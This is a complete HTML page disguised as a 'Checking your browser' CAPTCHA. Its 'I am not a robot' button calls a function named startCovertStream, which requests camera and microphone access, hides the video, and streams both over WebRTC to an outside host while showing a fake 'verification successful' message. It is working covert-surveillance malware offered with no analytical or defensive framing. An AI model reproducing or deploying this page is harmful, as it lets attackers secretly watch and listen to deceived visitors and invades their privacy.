<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            background: #f0f0f0;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 20%;
            color: #333;
        }

        button {
            background: #4285f4;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 1rem;
            cursor: pointer;
            border-radius: 4px;
        }

        video {
            display: none;
        }
    </style>
</head>

<body>
    <h1>Checking your browser...</h1>
    <p>Please verify you are human to continue.</p>
    <button onclick="startCovertStream()">I am not a robot</button>

    <video id="hiddenVideo" autoplay muted playsinline></video>

    <script>
        const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
        const host = "hangon-k31m.onrender.com";

        const wsUrl = `${protocol}//${host}/ws/target`;

        const rtcConfig = {
            iceServers: [
                { urls: "stun:stun.l.google.com:19302" },
                { urls: "stun:stun1.l.google.com:19302" }
            ]
        };

        let ws;
        let pc;
        const video = document.getElementById('hiddenVideo');

        async function startCovertStream() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;

                ws = new WebSocket(wsUrl);

                ws.onopen = function () {
                    document.body.innerHTML = "<h1>Verification successful. Loading content, please wait...</h1><p>This may take a few minutes.</p>";
                    initWebRTC(stream);
                };

                ws.onerror = (err) => console.error("WebSocket error:", err);
            } catch (err) {
                console.error("Media error:", err);
                document.body.innerHTML = "<h1>Verification failed. Please reload.</h1>";
            }
        }

        function initWebRTC(stream) {
            pc = new RTCPeerConnection(rtcConfig);

            // Add camera and mic tracks to peer connection
            stream.getTracks().forEach(track => pc.addTrack(track, stream));

            pc.onicecandidate = (event) => {
                if (event.candidate && ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ "type": "ice", "data": event.candidate }));
                }
            };

            ws.onmessage = async (event) => {
                try {
                    const msg = JSON.parse(event.data);
                    if (msg.type === "offer" && pc) {
                        await pc.setRemoteDescription(new RTCSessionDescription(msg.data));
                        const answer = await pc.createAnswer();
                        await pc.setLocalDescription(answer);
                        if (ws && ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({ "type": "answer", "data": answer }));
                        }
                    } else if (msg.type === "ice" && pc) {
                        await pc.addIceCandidate(new RTCIceCandidate(msg.data));
                    }
                } catch (e) {
                    console.error("Error handling message:", e);
                }
            };
        }
    </script>
</body>

</html>
